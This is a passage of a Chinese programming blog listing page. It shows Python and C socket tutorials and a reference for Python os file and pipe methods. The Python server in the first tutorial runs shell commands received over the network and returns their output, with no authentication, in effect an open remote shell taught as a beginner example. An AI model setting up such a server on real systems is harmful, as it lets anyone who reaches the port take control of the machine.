class="string">'Done.'</span>)</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                       conn.sendall(cmd_result)   <span class="comment">#否则就把结果发给对端（即客户端）</span></div><div class="line">conn.close()     <span class="comment">#关闭连接</span></div></pre></td></tr></table></figure>
<h3 id="5、Socket编程之客户端代码："><a href="#5、Socket编程之客户端代码：" class="headerlink" title="5、Socket编程之客户端代码："></a>5、Socket编程之客户端代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@yangrong:/python<span class="comment"># cat day5-socket-client.py</span></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line">HOST=<span class="string">'10.0.0.245'</span></div><div class="line">PORT=<span class="number">50007</span></div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      <span class="comment">#定义socket类型，网络通信，TCP</span></div><div class="line">s.connect((HOST,PORT))       <span class="comment">#要连接的IP与端口</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">       cmd=raw_input(<span class="string">"Please input cmd:"</span>)       <span class="comment">#与人交互，输入命令</span></div><div class="line">       s.sendall(cmd)      <span class="comment">#把命令发送给对端</span></div><div class="line">       data=s.recv(<span class="number">1024</span>)     <span class="comment">#把接收的数据定义为变量</span></div><div class="line">        <span class="keyword">print</span> data         <span class="comment">#输出变量</span></div><div class="line">s.close()   <span class="comment">#关闭连接</span></div></pre></td></tr></table></figure>
<h3 id="6、程序缺限："><a href="#6、程序缺限：" class="headerlink" title="6、程序缺限："></a>6、程序缺限：</h3><p>这是一个简单的socket通信，里面存在一些bug</p>
<p>1.在客户端输入回车，会挂死。</p>
<p>2.服务端返回的数据大于1024，客户端显示不全。</p>
<p>3.单进程，如果多个客户端连接，要排队，前一个断开，后一个客户端才能通信。</p>
<p>不想把代码写的太复杂，简单的说下解决方案：</p>
<p>问题1.在客户端上判断输入为空，要求重新输入。</p>
<p>问题2.在客户端上循环接收，直到接收完。但有没有完客户端是不知道的，需要服务端发一个结束符。</p>
<p>问题3.在服务端导入SocketServer模块，使得每建立一个连接，就新创建一个线程。实现多个客户端与服务端通信。多线程通信原理如下图：</p>
<p><a href="http://img1.51cto.com/attachment/201312/000109234.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201312/000109234.jpg" alt="000109234.jpg"></a></p>
<h3 id="python-socket参考地址："><a href="#python-socket参考地址：" class="headerlink" title="python socket参考地址："></a>python socket参考地址：</h3><p><a href="http://blog.163.com/yi_yixinyiyi/blog/static/136286889201152814341144/" target="_blank" rel="external">http://blog.163.com/yi_yixinyiyi/blog/static/136286889201152814341144/</a></p>
<p><a href="http://blog.sina.com.cn/s/blog_4b5039210100ep72.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_4b5039210100ep72.html</a></p>
<p><a href="http://blog.sina.com.cn/s/blog_523491650100hikg.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_523491650100hikg.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/04/code/c-socket编程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/04/code/c-socket编程/" itemprop="url">socket编程</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-04T22:25:45+08:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Linux下的socket编程"><a href="#Linux下的socket编程" class="headerlink" title="Linux下的socket编程"></a>Linux下的socket编程</h3><h4 id="server-c"><a href="#server-c" class="headerlink" title="server.c"></a>server.c</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INET_ADDR_STR 16 </span></div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_fun</span><span class="params">(<span class="keyword">char</span> *p)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>( ; *p != <span class="string">'\0'</span> ; p++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((*p &gt;= <span class="string">'a'</span>) &amp;&amp; (*p &lt;= <span class="string">'z'</span>))</div><div class="line">        &#123;</div><div class="line">            *p = *p - <span class="number">32</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span>     <span class="comment">//服务器通信地址结构</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cin</span>;</span>     <span class="comment">//保存客户端通信地址结构</span></div><div class="line">    <span class="keyword">int</span> l_fd;</div><div class="line">    <span class="keyword">int</span> c_fd;</div><div class="line">    <span class="keyword">socklen_t</span> len;</div><div class="line">    <span class="keyword">char</span> buf[MAX_LINE];     <span class="comment">//存储传送内容的缓冲区</span></div><div class="line">    <span class="keyword">char</span> addr_p[INET_ADDR_STR]; <span class="comment">//存储客户端地址的缓冲区</span></div><div class="line">    <span class="keyword">int</span> port = <span class="number">8000</span>;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    bzero((<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;   <span class="comment">//使用IPV4通信域</span></div><div class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = INADDR_ANY;   <span class="comment">//服务器可以接受任意地址</span></div><div class="line">    <span class="built_in">sin</span>.sin_port = htons(port); <span class="comment">//端口转换为网络字节序</span></div><div class="line">     </div><div class="line">    l_fd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);   <span class="comment">//创建套接子,使用TCP协议</span></div><div class="line">    bind(l_fd,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">     </div><div class="line">    listen(l_fd,<span class="number">10</span>);    <span class="comment">//开始监听连接</span></div><div class="line">     </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"waiting ....\n"</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        c_fd = accept(l_fd,(struct sockaddr *)&amp;<span class="built_in">cin</span>,&amp;len);</div><div class="line">         </div><div class="line">        n = read(c_fd,buf,MAX_LINE);    <span class="comment">//读取客户端发送来的信息</span></div><div class="line">        inet_ntop(AF_INET,&amp;<span class="built_in">cin</span>.sin_addr,addr_p,INET_ADDR_STR);      <span class="comment">//将客户端传来地址转化为字符串</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"client IP is %s,port is %d\n"</span>,addr_p,ntohs(<span class="built_in">cin</span>.sin_port));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"content is : %s\n"</span>, buf);   <span class="comment">//打印客户端发送过来的数据</span></div><div class="line">        my_fun(buf);</div><div class="line">        write(c_fd,buf,n);          <span class="comment">//转换后发给客户端</span></div><div class="line"> </div><div class="line">        close(c_fd);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"buf = %s\n"</span>,buf);</div><div class="line">    <span class="keyword">if</span>((close(l_fd)) == <span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"fail to close\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="client-c"><a href="#client-c" class="headerlink" title="client.c"></a>client.c</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> </div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span>     <span class="comment">//服务器的地址</span></div><div class="line">    <span class="keyword">char</span> buf[MAX_LINE];</div><div class="line">    <span class="keyword">int</span> sfd;</div><div class="line">    <span class="keyword">int</span> port = <span class="number">8000</span>;</div><div class="line">    <span class="keyword">char</span> *str = <span class="string">"test string"</span>;</div><div class="line">    <span class="keyword">char</span> *serverIP = <span class="string">"127.0.0.1"</span>;</div><div class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        str = argv[<span class="number">1</span>];  <span class="comment">//读取用户输入的字符串</span></div><div class="line">    &#125;</div><div class="line">    bzero((<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;   <span class="comment">//使用IPV4地址族</span></div><div class="line">     </div><div class="line">    inet_pton(AF_INET,serverIP,(<span class="keyword">void</span> *)&amp;(<span class="built_in">sin</span>.sin_addr));</div><div class="line">    <span class="built_in">sin</span>.sin_port = htons(port);</div><div class="line">     </div><div class="line">    sfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</div><div class="line">     </div><div class="line">    connect(sfd,(struct sockaddr *)&amp;(<span class="built_in">sin</span>),<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line"> </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"str = %s\n"</span> , str);</div><div class="line">    write(sfd , str , <span class="built_in">strlen</span>(str) + <span class="number">1</span>);</div><div class="line">    read(sfd , buf , MAX_LINE);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"recive from server: %s\n"</span> , buf);</div><div class="line"> </div><div class="line">    close(sfd);</div><div class="line">     </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/04/code/python-OS-文件-目录方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/04/code/python-OS-文件-目录方法/" itemprop="url">python OS 文件/目录方法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-04T21:28:26+08:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>os</strong> 模块提供了非常丰富的方法用来处理文件和目录。</p>
<h4 id="os-pipe"><a href="#os-pipe" class="headerlink" title="os.pipe()"></a><a href="http://www.runoob.com/python/os-pipe.html" target="_blank" rel="external">os.pipe()</a></h4><p>创建一个管道，返回一对文件描述符(r,w)分别为读和写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">stdinr,stdinw = os.pipe()</div><div class="line">stderrr,stderrw = os.pipe()</div><div class="line">os.write(stdinw, <span class="string">"\x00\x0a\x00\xff"</span>)</div><div class="line">os.write(stderrw, <span class="string">"\x00\x0a\x02\xff"</span>)</div><div class="line"></div><div class="line">proc = subprocess.Popen([<span class="string">"./input"</span>] + args, env=dict(os.environ, **env), stdin=stdinr, stderr=stderrr)</div></pre></td></tr></table></figure>
<blockquote>
<p>上述表示从标准输入中读入&quot;\x00\x0a\x00\xff&quot;，从标准错误中读入&quot;\x00\x0a\x02\xff&quot;</p>
</blockquote>
<h4 id="os-popen-command-mode-bufsize"><a href="#os-popen-command-mode-bufsize" class="headerlink" title="[os.popen(command, mode[, bufsize]])"></a>[os.popen(command<a href="http://www.runoob.com/python/os-popen.html" target="_blank" rel="external">, mode[, bufsize]])</a></h4><p>从一个 command 打开一个管道</p>
<ul>
<li><strong>command</strong> -- 使用的命令。</li>
<li><strong>mode</strong> -- 模式权限可以是 &#39;r&#39;(默认) 或 &#39;w&#39;。</li>
<li><strong>bufsize</strong> -- 指明了文件需要的缓冲大小：0意味着无缓冲；1意味着行缓冲；其它正值表示使用参数大小的缓冲（大概值，以字节为单位）。负的bufsize意味着使用系统的默认值，一般来说，对于tty设备，它是行缓冲；对于其它文件，它是全缓冲。如果没有改参数，使用系统的默认值。</li>
</ul>
<p><strong>返回值</strong></p>
<p>​    返回一个文件描述符号为fd的打开的文件对象</p>
<h4 id="os-open-file-flags-mode"><a href="#os-open-file-flags-mode" class="headerlink" title="os.open(file, flags[, mode])"></a><a href="http://www.runoob.com/python/os-open.html" target="_blank" rel="external">os.open(file, flags[, mode])</a></h4><p>打开一个文件，并且设置需要的打开选项，mode参数是可选的</p>
<ul>
<li><strong>file</strong> -- 要打开的文件</li>
<li><strong>flags</strong> -- 该参数可以是以下选项，多个使用 &quot;|&quot; 隔开：<ul>
<li><strong>os.O_RDONLY:</strong> 以只读的方式打开</li>
<li><strong>os.O_WRONLY:</strong> 以只写的方式打开</li>
<li><strong>os.O_RDWR :</strong> 以读写的方式打开</li>
<li><strong>os.O_NONBLOCK:</strong> 打开时不阻塞</li>
<li><strong>os.O_APPEND:</strong> 以追加的方式打开</li>
<li><strong>os.O_CREAT:</strong> 创建并打开一个新文件</li>
<li><strong>os.O_TRUNC:</strong> 打开一个文件并截断它的长度为零（必须有写权限）</li>
<li><strong>os.O_EXCL:</strong> 如果指定的文件存在，返回错误</li>
<li><strong>os.O_SHLOCK:</strong> 自动获取共享锁</li>
<li><strong>os.O_EXLOCK:</strong> 自动获取独立锁</li>
<li><strong>os.O_DIRECT:</strong> 消除或减少缓存效果</li>
<li><strong>os.O_FSYNC :</strong> 同步写入</li>
<li><strong>os.O_NOFOLLOW:</strong> 不追踪软链接</li>
</ul>
</li>
<li><strong>mode</strong> -- 类似 <a href="http://www.runoob.com/python/os-chmod.html" target="_blank" rel="external">chmod()</a>。</li>
</ul>
<p><strong>返回值</strong></p>
<p>返回新打开文件的描述符。</p>
<h4 id="os-read-fd-n"><a href="#os-read-fd-n" class="headerlink" title="os.read(fd, n)"></a><a href="http://www.runoob.com/python/os-read.html" target="_blank" rel="external">os.read(fd, n)</a></h4><p>从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。</p>
<h4 id="os-write-fd-str"><a href="#os-write-fd-str" class="headerlink" title="os.write(fd, str)"></a><a href="http://www.runoob.com/python/os-write.html" target="_blank" rel="external">os.write(fd, str)</a></h4><p>写入字符串到文件描述符 fd中. 返回实际写入的字符串长度</p>
<h4 id="os-close-fd"><a href="#os-close-fd" class="headerlink" title="os.close(fd)"></a><a href="http://www.runoob.com/python/os-close.html" target="_blank" rel="external">os.close(fd)</a></h4><p>关闭文件描述符 fd</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/me.jpg"
               alt="Introspelliam" />
          <p class="site-author-name" itemprop="name">Introspelliam</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">125</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">17</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">56</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Introspelliam</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
